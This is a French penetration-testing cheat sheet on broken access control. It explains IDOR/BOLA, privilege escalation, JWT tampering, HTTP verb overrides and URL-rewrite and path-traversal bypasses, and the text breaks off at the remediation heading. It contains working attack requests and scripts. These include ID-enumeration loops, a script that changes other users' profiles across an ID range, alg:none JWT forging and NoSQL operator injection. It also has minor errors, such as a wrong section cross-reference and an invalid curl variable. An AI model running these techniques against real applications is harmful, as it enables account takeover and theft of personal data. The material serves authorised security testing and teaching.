---
title: "Broken Access Control — Contrôle d'Accès, IDOR & BOLA"
description: "Analyse approfondie du contrôle d'accès web : définitions, typologie (vertical/horizontal/contextuel), modèles (DAC/MAC/RBAC/ABAC), vecteurs d'exploitation, focus IDOR/BOLA, détection et remédiation."
tags:
  - web
  - api
  - idor
  - bola
  - access-control
  - broken-access-control
  - owasp
  - rbac
  - abac
  - dac
  - mac
  - vertical-access-control
  - horizontal-access-control
  - graphql
  - jwt
  - http-verb-tampering
  - hpp
---

# 🛡️ Broken Access Control — fiche de triche terrain

!!! warning "Cadre légal"
    Ces techniques ne doivent être mises en œuvre que dans un cadre légal explicite : laboratoire, CTF, ou test d'intrusion couvert par une autorisation écrite.

---

## 1. Généralités sur le Contrôle d'Accès

### 1.1 Définition

Le **contrôle d'accès** désigne l'ensemble des **contraintes déterminant qui — ou quoi — est autorisé à effectuer une action ou à accéder à une ressource** donnée dans une application. C'est la fonction de sécurité qui applique concrètement la politique de permissions de l'organisation sur chaque requête traitée.

### 1.2 Les trois piliers fondamentaux des applications web

Le contrôle d'accès ne fonctionne jamais isolément : il s'appuie sur deux mécanismes préalables avec lesquels il est souvent confondu à tort.

| Pilier | Question posée | Rôle |
|---|---|---|
| **1. Authentification** | *Qui êtes-vous ?* | Confirme l'identité du sujet (login/mot de passe, MFA, certificat, token). |
| **2. Gestion de session** | *S'agit-il bien de la même personne à chaque requête ?* | Permet d'identifier, sur la durée, les requêtes successives émises par un même utilisateur authentifié (cookie de session, JWT, etc.). |
| **3. Contrôle d'accès** | *Cette action est-elle autorisée ?* | Détermine, pour un sujet authentifié et identifié, si l'action demandée sur la ressource ciblée est permise. |

!!! danger "Authentification ≠ Autorisation"
    Une application peut disposer d'une authentification robuste (MFA, mots de passe forts) tout en étant totalement vulnérable si le **troisième pilier** — le contrôle d'accès proprement dit — est absent ou mal implémenté sur certains endpoints. Les trois piliers doivent être évalués **indépendamment** lors d'un audit.

### 1.3 Criticité

Les failles de **Broken Access Control (BAC)** figurent parmi les vulnérabilités web les **plus répandues** et présentent un **niveau de risque très élevé** : elles occupent la première place du classement **OWASP Top 10** (*A01:2021 — Broken Access Control*) et de l'**OWASP API Security Top 10** (*API1:2023 — Broken Object Level Authorization*). Leur exploitation ne nécessite généralement **aucun outil sophistiqué** : une simple modification de paramètre, d'URL ou d'en-tête HTTP suffit souvent à démontrer l'impact.

---

## 2. Typologie des Contrôles d'Accès

### 2.1 Vertical Access Control

Le contrôle d'accès **vertical** restreint l'accès aux **fonctionnalités sensibles** selon le rôle ou le type de compte (ex : rédacteur vs administrateur, utilisateur standard vs support).

!!! warning "Risque : accès non autorisé à une fonctionnalité d'administration"
    Un utilisateur standard parvenant à invoquer directement une URL d'administration telle que `/admin/delete-user`, sans jamais disposer du rôle requis, illustre une rupture classique du contrôle d'accès vertical.

### 2.2 Horizontal Access Control

Le contrôle d'accès **horizontal** limite l'accès aux ressources **entre utilisateurs de même niveau de privilège** : il garantit qu'un utilisateur ne peut consulter ou modifier **que ses propres données** (ex : un utilisateur dont l'identifiant est `user_id=101` ne doit jamais pouvoir accéder aux données associées à `user_id=102`).

!!! warning "Risque : IDOR / BOLA"
    La rupture du contrôle d'accès horizontal est le mécanisme à l'origine des failles **IDOR** (*Insecure Direct Object Reference*) et **BOLA** (*Broken Object Level Access*), détaillées en profondeur en [section 8](#8-focus-approfondi--idor--bola) de cette fiche.

### 2.3 Context-dependent Access Control

Le contrôle d'accès **contextuel** bloque ou autorise une action en fonction de **l'état courant de l'application** ou de **l'étape du workflow** en cours, indépendamment du rôle ou de la propriété de l'objet.

**Exemple :** la modification du contenu d'un panier d'achat doit être **interdite** une fois la commande validée et le paiement initié, même pour le propriétaire légitime du panier.

!!! warning "Risque : Flaws of Sequence (saut d'étapes)"
    L'absence de vérification de l'état du workflow permet un **saut d'étapes** : un attaquant rejoue ou invoque directement une requête correspondant à une étape avancée du processus (ex : confirmation de commande, déblocage de fonds) sans avoir complété les étapes préalables requises (paiement, validation KYC, etc.).

---

## 3. Modèles de Contrôle d'Accès Sécurisé

Au-delà de la typologie fonctionnelle (vertical/horizontal/contextuel), le contrôle d'accès peut être **implémenté** selon différents modèles architecturaux :

| Modèle | Principe | Cas d'usage typique |
|---|---|---|
| **Programmatic Access Control** | Règles de sécurité **codées explicitement** ou **calculées dynamiquement** dans la logique applicative (matrices de privilèges, moteurs de décision croisant rôle, montant de la transaction, statut VIP, état du workflow, etc.) | Logiques métier complexes où une simple association rôle → permission est insuffisante |
| **Discretionary Access Control (DAC)** | L'accès est laissé à la **discrétion du propriétaire** de l'objet, qui peut lui-même accorder ou révoquer des droits à des tiers | Partage de fichiers (Google Drive, Dropbox), partage de documents collaboratifs |
| **Mandatory Access Control (MAC)** | Politique **centralisée et stricte**, définie par une autorité ou un administrateur système ; l'utilisateur final ne peut pas la modifier | Niveaux de classification gouvernementaux/militaires (ex : *Secret Défense*), environnements à exigences réglementaires fortes |
| **Role-based Access Control (RBAC)** | Les **permissions sont associées à des rôles métiers** (ex : « Gestionnaire de stock », « Support niveau 1 »), eux-mêmes attribués aux utilisateurs | Majorité des applications d'entreprise ; granularité suffisante tant que les droits ne dépendent pas de la relation utilisateur ↔ objet précis |

!!! info "RBAC vs ABAC : complémentarité"
    Le modèle **RBAC** présenté ci-dessus répond bien à la question *« cet utilisateur a-t-il, en général, le droit d'effectuer cette action ? »*. Il atteint cependant ses limites dès qu'il faut répondre à *« cet utilisateur a-t-il le droit sur **cet objet précis** ? »* — question au cœur des failles IDOR/BOLA. Le modèle **ABAC** (*Attribute-Based Access Control*), qui combine plusieurs attributs (rôle **et** propriétaire **et** tenant **et** état de l'objet), est alors nécessaire. Voir la comparaison détaillée RBAC vs ABAC en [section 8.5](#85-remédiation--hardening-perspective-blue-team).

---

## 4. Exploitation IDOR (Insecure Direct Object References)

| Type | Principe | Exemple |
|---|---|---|
| **IDOR horizontal** | Accès aux données d'un autre utilisateur de même niveau de privilège | Voir la facture du client 1002 en étant le client 1001 |
| **IDOR vertical** | Accès à des fonctionnalités réservées à un niveau de privilège supérieur | Utilisateur standard accédant à une ressource réservée aux admins |

```bash
curl -H "Cookie: session=user1001" https://cible.com/api/invoice/1001    # Requête légitime
curl -H "Cookie: session=user1001" https://cible.com/api/invoice/1002    # Test IDOR horizontal
```

```bash
for id in $(seq 1000 1100); do
  curl -s -H "Cookie: session=user1001" "https://cible.com/api/invoice/$id" \
    -o "invoice_${id}.json" -w "ID %{id} : %{http_code}\n"
done
# Énumère une plage d'ID pour identifier les ressources accessibles sans contrôle d'appartenance
```

### Prédictibilité des paramètres

| Format d'identifiant | Prédictibilité | Exemple |
|---|---|---|
| ID séquentiel entier | Élevée | `?id=1042` → `?id=1043` trivialement devinable |
| UUID v4 (aléatoire) | Très faible | `?id=3f2b1c8e-...` — 122 bits d'entropie effective |
| UUID v1 (basé timestamp/MAC) | Modérée | Contient des informations temporelles partiellement déductibles |
| Hash court non salé | Variable | Brute-forçable si l'espace de valeurs sources est restreint |

!!! tip "UUID n'est pas une garantie de sécurité en soi"
    Un UUID rend l'énumération séquentielle impraticable, mais ne remplace jamais un contrôle d'autorisation côté serveur : un UUID divulgué (log, URL partagée, referer) reste directement exploitable sans aucune protection supplémentaire.

!!! warning "Contrôle d'accès manquant = vulnérabilité, quel que soit le format d'ID"
    Le véritable défaut n'est pas la prévisibilité de l'identifiant mais l'absence de vérification que l'utilisateur authentifié est bien autorisé à accéder à la ressource demandée.

---

## 5. Élévation de privilèges horizontale & verticale

### 5.1 Escalade de privilèges verticale — vecteurs complémentaires

Au-delà de la manipulation directe du corps de requête, des en-têtes et du JWT (sous-sections suivantes), l'escalade **verticale** s'appuie fréquemment sur les vecteurs suivants :

**Fonctionnalités non protégées (liens cachés)**

Certaines fonctionnalités sensibles sont simplement **absentes du menu de navigation** ou de l'interface visible pour un utilisateur standard, sans pour autant être protégées côté backend. Elles sont découvertes par :

- Exploration de `robots.txt` (chemins explicitement exclus de l'indexation, donc potentiellement sensibles).
- *Discover Content* de Burp Suite (brute-force de répertoires et de fichiers).

!!! warning "L'obscurité n'est pas de la sécurité (*security through obscurity*)"
    Des URLs volontairement complexes ou peu intuitives (ex : `/administrator-panel-yb556`) ne constituent **jamais** une protection valable. Ces chemins sont très souvent **divulgués malgré eux** par le code front-end (fichiers JavaScript, bundles webpack) ou retrouvés via l'outil *Find comments* de Burp Suite dans des commentaires de développement oubliés.

**Contrôles basés sur les paramètres**

Certaines applications accordent une **confiance aveugle** à une donnée entièrement contrôlable côté client pour déterminer le niveau de privilège de la requête :

```http
GET /account/settings?admin=true HTTP/1.1
Host: cible.com
Cookie: session=user_1001_session_token
```

```http
GET /account/settings HTTP/1.1
Host: cible.com
Cookie: session=user_1001_session_token; role=admin
```

Qu'il s'agisse d'un paramètre d'URL, d'un champ de formulaire caché (`<input type="hidden" name="isAdmin" value="false">`) ou d'un cookie, **aucune de ces valeurs ne doit jamais faire foi** sans revérification côté serveur à partir du contexte de session authentifié.

**Divergence de correspondance d'URL (*URL matching discrepancy*)**

Lorsque la couche qui applique le contrôle d'accès (middleware, reverse-proxy, WAF) et la couche qui route réellement la requête (routeur applicatif) ne normalisent pas les URLs de façon identique, un écart de correspondance peut être exploité pour contourner la règle de sécurité :

| Divergence | Exemple | Explication |
|---|---|---|
| **Incohérence de casse** | `/ADMIN/DELETEUSER` vs `/admin/deleteUser` | Un filtre sensible à la casse laisse passer une variante en majuscules que le routeur applicatif, lui, traite de façon insensible à la casse |
| **Extension de suffixe** | `/admin/deleteUser.json`, `/admin/deleteUser;.css` | Historiquement exploitable sur Spring Framework (< 5.3) avec `useSuffixPatternMatch` activé : le framework ignore le suffixe pour le routage mais le filtre de sécurité ne reconnaît pas la variante suffixée |
| **Slash de fin (*trailing slash*)** | `/admin/deleteUser` protégé par la règle de sécurité, mais `/admin/deleteUser/` reste accessible | Le filtre ne couvre que la forme exacte sans slash final, alors que le routeur applicatif traite les deux formes comme équivalentes |

!!! tip "Tester systématiquement les variantes de chemin"
    Pour toute route sensible identifiée, tester : variation de casse, ajout d'un slash final, ajout d'une extension de fichier factice (`.json`, `.css`, `;.css`), encodage URL des séparateurs. Voir également la [section 7](#7-bypass-de-contrôle-daccès-par-réécriture-durl) pour les techniques de traversée de chemin plus poussées (point-virgule matrix, double encodage).

### 5.2 Manipulation du corps de requête

```json
// Requête légitime d'inscription
{ "username": "test", "email": "test@mail.com", "role": "user" }
```

```json
// Requête modifiée : injection d'un champ non prévu par l'interface visible
{ "username": "test", "email": "test@mail.com", "role": "admin" }
```

!!! warning "Mass assignment"
    Si le backend associe automatiquement chaque champ JSON reçu à un attribut du modèle utilisateur sans liste blanche explicite, un champ absent du formulaire visible peut néanmoins être accepté et traité par l'API.

### 5.3 Manipulation d'en-têtes ou cookies

```bash
curl -H "X-User-Role: admin" https://cible.com/api/dashboard
# Teste si un en-tête custom non validé influence la logique d'autorisation

curl -H "Cookie: role=admin; session=abc123" https://cible.com/api/dashboard
# Teste un cookie de rôle manipulable côté client
```

### 5.4 Manipulation de JWT

```text
Header : { "alg": "HS256", "typ": "JWT" }
Payload : { "user": "test", "role": "user" }
```

```bash
echo '{"user":"test","role":"admin"}' | base64 -w0
# Ré-encode un payload modifié, à réassembler avec le header et une signature (valide si "alg":"none" accepté)
```

| Technique JWT | Principe |
|---|---|
| `alg: none` | Certaines implémentations acceptent une signature vide si l'algorithme est déclaré "none" |
| Confusion RS256 → HS256 | Utilise la clé publique RSA (souvent accessible) comme clé secrète HMAC de signature |
| Absence de vérification de signature | Le serveur décode le payload sans jamais valider la signature associée |

!!! tip "Décoder rapidement un JWT"
    `echo "<partie_payload>" | base64 -d` (ajouter le padding `=` manquant si nécessaire) révèle directement le contenu du payload sans outil dédié.

### 5.5 De l'horizontale vers la verticale

Une faille apparemment **horizontale** peut, par simple opportunité, se transformer en escalade **verticale** si l'identifiant manipulé correspond par hasard — ou après énumération — au compte d'un **administrateur**.

```http
GET /myaccount?id=123 HTTP/1.1
Host: cible.com
Cookie: session=user_1001_session_token
```

```http
GET /myaccount?id=465 HTTP/1.1
Host: cible.com
Cookie: session=user_1001_session_token
```

!!! danger "Pivot horizontal → vertical"
    Si l'identifiant `465` correspond au compte d'un administrateur, l'attaquant obtient alors, via une simple faille horizontale (IDOR), un accès direct aux **privilèges administrateur** du compte ciblé — y compris, selon le endpoint, la possibilité de modifier son mot de passe ou son adresse e-mail. Lors de toute campagne d'énumération d'IDOR, il est donc indispensable de **croiser les identifiants découverts avec les comptes à privilèges connus** (admin, support, finance) plutôt que de se limiter à des comptes de test standards.

### 5.6 Processus séquentiels & en-têtes de confiance erronée

**Omission de vérification à l'étape finale d'un workflow multi-étapes**

Dans un processus comportant plusieurs étapes (ex : création de compte → vérification d'identité → validation → activation), le contrôle d'autorisation est parfois appliqué uniquement sur les **premières étapes** et **omis sur l'étape finale**, qui exécute pourtant l'action réellement sensible (activation du compte, déblocage de fonds, publication).

```http
POST /workflow/step4/activate HTTP/1.1
Host: cible.com
Cookie: session=user_1001_session_token

{ "application_id": 9981 }
```

!!! warning "Rejouer directement la dernière étape"
    Un attaquant qui identifie l'endpoint de l'étape finale peut tenter de l'invoquer **directement**, sans avoir complété les étapes précédentes requises, si le serveur ne revérifie pas que les étapes antérieures ont bien été validées pour cette session/cet objet précis.

**Contrôle d'accès basé sur l'en-tête `Referer`**

```http
GET /admin/panel HTTP/1.1
Host: cible.com
Referer: https://cible.com/admin/menu
Cookie: session=user_1001_session_token
```

!!! danger "Le `Referer` est entièrement contrôlé par le client"
    Certaines implémentations défaillantes autorisent l'accès à une ressource sensible dès lors que l'en-tête `Referer` pointe vers une page interne légitime (ex : le menu d'administration), en considérant implicitement que l'utilisateur « est passé par là ». Cet en-tête étant **librement falsifiable** par le client (voire absent selon la politique `Referrer-Policy` du navigateur), il ne doit **jamais** servir de fondement à une décision d'autorisation.

**Contrôle d'accès basé sur la géolocalisation**

Certaines restrictions fonctionnelles ou réglementaires reposent sur la localisation apparente de l'utilisateur, déduite de son adresse IP ou d'un en-tête tel que `X-Forwarded-For`.

```bash
curl -H "X-Forwarded-For: 203.0.113.42" https://cible.com/api/region-locked-feature
# Falsification de l'en-tête pour simuler une provenance géographique différente
```

!!! warning "Contournement trivial"
    Un contrôle géographique reposant uniquement sur l'adresse IP source (ou pire, sur un en-tête `X-Forwarded-For` non validé) se contourne via un VPN, un proxy, ou une simple falsification de l'en-tête. La géolocalisation ne constitue **jamais**, à elle seule, un mécanisme de contrôle d'accès fiable et doit, le cas échéant, être combinée à d'autres facteurs d'authentification/autorisation robustes.

---

## 6. Contournement de verbes et méthodes HTTP

```bash
curl -X GET https://cible.com/admin/users/1/delete       # Bloqué (403) sur la méthode attendue
curl -X POST https://cible.com/admin/users/1/delete       # Test avec une autre méthode
curl -X PUT https://cible.com/admin/users/1/delete         # Test avec PUT
curl -X DELETE https://cible.com/admin/users/1              # Test avec DELETE explicite sur la ressource
```

```bash
curl -X POST -H "X-HTTP-Method-Override: DELETE" https://cible.com/admin/users/1
# Certains frameworks interprètent cet en-tête pour simuler une méthode non supportée par le client
```

| En-tête d'override | Framework concerné (historique) |
|---|---|
| `X-HTTP-Method-Override` | Rails, Symfony, ASP.NET (selon configuration) |
| `X-HTTP-Method` | Variante moins courante |
| `X-Method-Override` | Variante alternative |
| `_method` (paramètre de formulaire) | Rails, Laravel (override via corps de requête) |

!!! warning "Contrôle d'accès appliqué à une seule méthode"
    Une règle de contrôle d'accès configurée uniquement pour `GET /admin/*` (ex : au niveau reverse-proxy ou middleware) peut laisser passer une requête `POST`/`PUT`/`DELETE` identique en chemin si la règle n'est pas explicitement méthode-agnostique.

---

## 7. Bypass de contrôle d'accès par réécriture d'URL

### En-têtes de proxying

```bash
curl -H "X-Original-URL: /admin/dashboard" https://cible.com/
# Certains reverse-proxy/frameworks routent en interne selon cet en-tête plutôt que le chemin réel de la requête

curl -H "X-Rewrite-URL: /admin/dashboard" https://cible.com/
# Variante équivalente selon l'implémentation du middleware
```

!!! warning "Écart entre couche de filtrage et couche applicative"
    Si le pare-feu applicatif ou le reverse-proxy filtre sur l'URL de la requête HTTP réelle, mais que l'application interne route ensuite selon un en-tête distinct, un contournement complet du contrôle d'accès frontal devient possible.

### Path traversal dans l'URL

```bash
curl https://cible.com/admin/..;/dashboard
# Le point-virgule après ".." peut être interprété comme un séparateur de paramètre matrix par certains serveurs Java/Tomcat, contournant un filtre sur le préfixe "/admin/"

curl https://cible.com/%2e%2e/admin/dashboard
curl https://cible.com/admin%2f..%2fdashboard
# Variantes encodées, à tester si la normalisation d'URL diffère entre la couche de filtrage et le serveur applicatif
```

| Variante de traversée | Cible typique |
|---|---|
| `/admin/..;/dashboard` | Tomcat / serveurs interprétant le point-virgule comme séparateur matrix |
| `/admin/./dashboard` | Filtres ne normalisant pas les segments `.` |
| `/admin//dashboard` | Double slash non normalisé avant comparaison de préfixe |
| `/ADMIN/dashboard` | Comparaison sensible à la casse côté filtre, insensible côté route applicative |

!!! tip "Toujours comparer filtrage et routage réel"
    Ce type de contournement exploite systématiquement un désaccord de normalisation entre deux composants distincts de la chaîne (proxy/WAF vs serveur applicatif). Tester chaque variante d'encodage face à la route protégée reste la seule méthode fiable de détection.

---

## 8. Focus approfondi — IDOR / BOLA

### 8.1 Résumé exécutif & contexte

**IDOR** (*Insecure Direct Object Reference*) et **BOLA** (*Broken Object Level Authorization*) désignent la même famille de défaut : une application expose une référence directe vers un objet interne (ligne de base de données, fichier, ressource) et **traite une requête sur cet objet sans revérifier que l'utilisateur authentifié en est le propriétaire ou dispose des droits requis**.

- **OWASP Top 10 Web (2021)** : classé sous `A01:2021 — Broken Access Control`, catégorie qui regroupe à elle seule la majorité des incidents recensés dans le rapport.
- **OWASP API Security Top 10 (2023)** : classé `API1:2023 — Broken Object Level Authorization`, en tête de liste, car les API REST/GraphQL exposent structurellement des identifiants d'objets dans chaque endpoint (`/api/orders/{id}`, `/api/users/{id}/documents/{doc_id}`, etc.), ce qui démultiplie la surface d'attaque par rapport à une application web monolithique.

!!! danger "Authentification ≠ Autorisation"
    - **Authentification** (*Who you are*) : le serveur vérifie que la requête provient bien d'une identité connue (session valide, JWT signé, clé API valide).
    - **Autorisation** (*What you can do*) : le serveur vérifie que **cette identité précise** a le droit d'effectuer **cette action précise** sur **cet objet précis**.

    Un IDOR/BOLA est presque toujours un défaut de la seconde couche alors que la première fonctionne parfaitement : la victime est un utilisateur légitime, authentifié, qui abuse simplement d'un contrôle d'autorisation absent ou incomplet.

**Impacts métier typiques :**

| Impact | Exemple concret |
|---|---|
| Exfiltration massive de données | Énumération de `?invoice_id=` permettant de télécharger l'intégralité des factures d'un SaaS B2B |
| Modification non autorisée | Changement du mot de passe ou de l'e-mail d'un tiers via `PATCH /api/users/{id}` |
| Élévation horizontale | Un client accède aux données d'un autre client de même rang (même tenant ou tenant différent) |
| Élévation verticale | Un utilisateur standard exécute une action réservée à un rôle admin via un endpoint mal protégé |
| Effet domino RGPD/conformité | Une simple fuite d'IDOR sur des données personnelles déclenche une obligation de notification réglementaire |

---

### 8.2 Mécanisme & fonctionnement interne

Le défaut se situe presque toujours dans la couche de traitement de la requête, **après** l'authentification et **avant** ou **pendant** l'accès aux données :

```text
Requête HTTP → Authentification (OK) → Récupération de l'objet par ID → [ÉTAPE MANQUANTE] → Retour de la réponse
                                                                              ↑
                                                        Vérification que subject == owner(object)
                                                        ou que subject.role permet l'action demandée
```

Concrètement, le code applicatif exécute souvent une requête du type :

```sql
SELECT * FROM invoices WHERE id = :id;
-- au lieu de :
SELECT * FROM invoices WHERE id = :id AND owner_id = :current_user_id;
```

La simple présence d'une clause `WHERE id = :id` sans filtre de propriétaire suffit à rendre l'endpoint vulnérable, quelle que soit la qualité du reste de l'architecture (chiffrement, WAF, authentification forte).

**Pourquoi la possession ou la devinabilité d'un identifiant n'est jamais une preuve d'autorisation :**

- Un identifiant (numérique, UUID, hash) est une **clé de recherche technique**, pas un **jeton de preuve de droit**. Le confondre revient à considérer que connaître le numéro de compte bancaire d'un tiers suffit à en disposer.
- Un identifiant peut être obtenu par un canal totalement hors du contrôle applicatif : URL partagée par e-mail, historique de navigateur, logs de proxy, en-tête `Referer`, réponse d'un autre endpoint moins protégé, ou simple export CSV mal filtré.

**Monolithe (sessions/cookies) vs API stateless (JWT/microservices) :**

| Aspect | Application monolithique | API REST/GraphQL stateless |
|---|---|---|
| État de session | Conservé côté serveur (session store), le contexte utilisateur est recalculé à chaque requête | Le contexte utilisateur est encodé dans le token (JWT) et **doit être revalidé** à chaque appel, y compris inter-services |
| Surface d'exposition | Généralement un seul point d'entrée applicatif | Chaque microservice peut réimplémenter (ou oublier) son propre contrôle d'autorisation |
| Risque spécifique | Oubli d'un contrôle sur une route secondaire (export, impression, backoffice) | Un microservice interne fait confiance à un microservice appelant sans revérifier le contexte utilisateur transmis (confused deputy), ou le token JWT est décodé mais son contenu (`role`, `tenant_id`) n'est jamais recroisé avec l'objet demandé |
| GraphQL en particulier | N/A | Un même `resolver` peut être appelé via plusieurs chemins de requête (query imbriquées, alias multiples) ; un contrôle d'autorisation posé au niveau du endpoint HTTP n'est d'aucune utilité si le contrôle n'est pas répété **au niveau du resolver / du champ** |

!!! warning "Cas classique de microservices : la confiance implicite inter-services"
    Un service front-office authentifie l'utilisateur, extrait `user_id` du JWT, puis appelle un service interne `GET /internal/orders/{order_id}` **sans transmettre ni revérifier** `user_id`. Le service interne, supposant que l'appel provient d'un composant de confiance, retourne l'objet sans filtre de propriétaire. Le BOLA se situe alors dans le service interne, invisible depuis un simple test de la façade publique.

---

### 8.3 Empreinte & détection

#### Reconnaissance et cartographie des paramètres sensibles

Avant tout test, cartographier systématiquement où un identifiant d'objet peut apparaître :

- **URL / path** : `/api/users/1042`, `/documents/{doc_id}/download`
- **Query string** : `?invoice_id=1042`, `?account=1042`
- **Corps JSON** : `{"user_id": 1042}`, `{"target": {"id": 1042}}`
- **En-têtes HTTP custom** : `X-User-Id`, `X-Account-Ref`, `X-Original-User-ID`
- **Paramètres GraphQL** : arguments de `query`/`mutation` (`user(id: "1042")`), variables passées séparément du corps de la requête
- **Cookies** : identifiants de compte ou de session stockés en clair ou faiblement encodés

```bash
# Interception passive : lister tous les paramètres numériques/UUID observés sur une session de navigation
# (utile avant tout test actif, pour construire une liste exhaustive de points d'entrée)
grep -Eo '"[a-zA-Z_]*(id|Id|ID)"\s*:\s*"?[0-9a-fA-F-]+"?' burp_history.json | sort -u
```

#### Typologie des identifiants

| Type | Prédictibilité | Exemple | Remarque |
|---|---|---|---|
| Séquentiel/incrémental | Élevée | `?id=1042` | Énumérable trivialement en itérant sur la plage |
| Encodé Base64/Hex | Faible en apparence, triviale en pratique | `aWQ9MTA0Mg==` → `id=1042` | Le décodage ne change rien à la vulnérabilité sous-jacente, seul l'effort de reconnaissance augmente légèrement |
| Hash non salé (ex : `md5(user_id)`) | Variable, souvent forte si l'espace source est restreint | `md5("1042")` = `hash fixe` | Brute-forçable hors ligne si la plage de `user_id` plausible est connue ou bornée |
| UUIDv1 (timestamp + MAC) | Modérée | Contient un horodatage et un identifiant matériel partiellement reconstructibles | Ne jamais utiliser pour des identifiants sensibles à faire circuler côté client |
| UUIDv4 (aléatoire) | Très faible (122 bits d'entropie) | `3f2b1c8e-...` | Rend l'énumération impraticable mais **ne dispense jamais** du contrôle d'autorisation serveur |

#### Analyse comportementale des réponses HTTP

Le code de statut retourné distingue souvent un IDOR/BOLA "visible" d'un IDOR/BOLA "aveugle" :

| Code retourné pour un objet appartenant à un tiers | Interprétation |
|---|---|
| `200 OK` avec les données du tiers | Vulnérabilité confirmée et directement exploitable |
| `403 Forbidden` | Contrôle d'autorisation présent — comportement attendu |
| `401 Unauthorized` | Généralement un défaut d'authentification, pas un IDOR à proprement parler |
| `404 Not Found` pour un ID existant | Souvent une **fausse négative volontaire** (bonne pratique : ne pas confirmer l'existence de l'objet) — à ne pas confondre avec un ID réellement inexistant |
| `200 OK` avec un corps vide/générique mais code 200 | **IDOR aveugle** : la différence de comportement (temps de réponse, taille de la réponse, présence d'un champ précis) peut tout de même confirmer l'existence de l'objet sans en exposer le contenu |

!!! tip "Différentiel de réponse comme oracle"
    Lorsqu'aucune donnée n'est visible directement, comparer systématiquement : temps de réponse, taille du corps de réponse (octets), présence/absence d'un en-tête `ETag` ou `Content-Length`, et messages d'erreur légèrement différents entre un ID existant appartenant à un tiers et un ID totalement inexistant. Un écart constant et reproductible constitue un oracle exploitable même sans exfiltration directe.

---

### 8.4 Méthodologie d'exploitation & variantes

#### Variante 1 : IDOR classique par manipulation de paramètres d'URL (GET)

```http
GET /api/documents/4471 HTTP/1.1
Host: cible.com
Cookie: session=user_1001_session_token
Accept: application/json
```

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "id": 4471,
  "owner_id": 1001,
  "filename": "contrat_confidentiel_2026.pdf",
  "download_url": "/files/4471.pdf"
}
```

Test IDOR : remplacement de l'identifiant par celui d'une ressource appartenant à un autre utilisateur, en conservant la session `user_1001` :

```http
GET /api/documents/4472 HTTP/1.1
Host: cible.com
Cookie: session=user_1001_session_token
Accept: application/json
```

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "id": 4472,
  "owner_id": 1002,
  "filename": "bulletin_paie_janvier_2026.pdf",
  "download_url": "/files/4472.pdf"
}
```

!!! danger "Confirmation IDOR"
    Le code `200 OK` renvoyant un objet dont `owner_id` diffère du compte authentifié (`1001`) confirme une absence totale de vérification de propriété côté serveur.

#### Variante 2 : BOLA sur API REST/JSON (POST/PUT/PATCH/DELETE)

Modification du profil d'un tiers via substitution d'identifiant **dans le corps** de la requête plutôt que dans l'URL :

```http
PATCH /api/v2/users/profile HTTP/1.1
Host: cible.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Content-Type: application/json

{
  "target_user_id": 1002,
  "email": "attacker-controlled@mail.com",
  "phone": "+33600000000"
}
```

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "status": "updated",
  "user_id": 1002,
  "email": "attacker-controlled@mail.com"
}
```

```python
# Script d'automatisation : parcours d'une plage d'ID pour évaluer l'ampleur d'un BOLA en PATCH
import requests

BASE_URL = "https://cible.com/api/v2/users/profile"
HEADERS = {
    "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
    "Content-Type": "application/json",
}

for target_id in range(1000, 1050):
    payload = {"target_user_id": target_id, "phone": "+33600000000"}
    r = requests.patch(BASE_URL, json=payload, headers=HEADERS, timeout=5)
    print(f"target_user_id={target_id} -> {r.status_code}")
    # Un taux élevé de 200 OK sur des ID hors périmètre du compte authentifié confirme le BOLA
```

#### Variante 3 : Bypasses et contournements courants

**Polymorphisme de type** — envoyer une structure différente de celle attendue par le validateur peut contourner une vérification d'égalité stricte mal implémentée :

```json
// Requête attendue par le validateur
{ "id": 1002 }
```

```json
// Tableau au lieu d'un entier : certains ORMs interprètent le premier élément ou toute la liste
{ "id": [1002] }
```

```json
// Opérateur NoSQL injecté dans un contexte MongoDB : contourne une comparaison stricte
{ "id": { "$ne": 0 } }
```

!!! warning "Injection d'opérateurs NoSQL et contrôle d'accès"
    Si le contrôle d'autorisation repose sur une comparaison `id === expected_id` réalisée côté application **après** une requête MongoDB qui, elle, interprète `{"$ne": 0}` comme "tout document dont l'id est différent de 0", la requête retourne potentiellement le premier document de la collection, indépendamment du propriétaire réel.

**Pollution de paramètres HTTP (HPP)** — envoi du même paramètre en double, dont l'interprétation diverge entre couche de validation et couche de traitement :

```bash
curl -G "https://cible.com/api/invoice" \
  --data-urlencode "id=1001" \
  --data-urlencode "id=1002"
# Certains frameworks/serveurs web ne retiennent que la dernière occurrence (Node/Express),
# d'autres la première (PHP/Apache selon configuration), d'autres encore concaténent les deux
# en tableau — un désaccord entre la couche de contrôle d'accès et la couche de traitement
# métier sur laquelle des deux valeurs est utilisée ouvre une fenêtre de contournement.
```

| Serveur/Framework | Comportement typique sur paramètre dupliqué |
|---|---|
| PHP (Apache/Nginx par défaut) | Retient la **dernière** occurrence |
| Node.js / Express (`qs`) | Retourne un **tableau** des deux valeurs |
| ASP.NET | Concatène les valeurs séparées par une virgule |
| Certains reverse-proxies | Retiennent la **première** occurrence avant transmission au backend |

**Substitution de verbes HTTP non documentés** — cf. section 3 de ce document, directement applicable à un endpoint IDOR/BOLA : tester `GET` sur une route normalement en `POST`, ou `PUT`/`DELETE` non exposés dans la documentation publique mais actifs côté routeur.

**Wrapping d'identifiants dans des en-têtes custom** :

```bash
curl -H "X-Original-User-ID: 1002" \
     -H "X-Forwarded-For: 10.0.0.5" \
     -H "Cookie: session=user_1001_session_token" \
     https://cible.com/api/account/settings
# Teste si un composant interne (cache, proxy applicatif, service de logging) fait
# confiance à un en-tête custom pour déterminer le user_id effectif, au lieu de
# dériver ce contexte exclusivement depuis la session/le token authentifié.
```

**IDOR masqué / de second ordre** — l'identifiant sensible n'est pas directement manipulé, mais référencé indirectement via un autre objet dont l'appartenance n'est, elle, pas vérifiée :

```http
GET /api/invoices/9981/download?format=pdf HTTP/1.1
Host: cible.com
Cookie: session=user_1001_session_token
```

Si `invoice_id=9981` appartient à `user_1002`, mais que le endpoint de téléchargement vérifie uniquement l'existence de la facture (et non son propriétaire) avant de streamer le PDF associé, l'accès non autorisé se produit **sans jamais manipuler directement un identifiant utilisateur** — seul l'identifiant de la ressource dérivée (la facture) est en cause.

---

### 8.5 Remédiation & hardening (perspective Blue Team)

!!! danger "Principe fondamental"
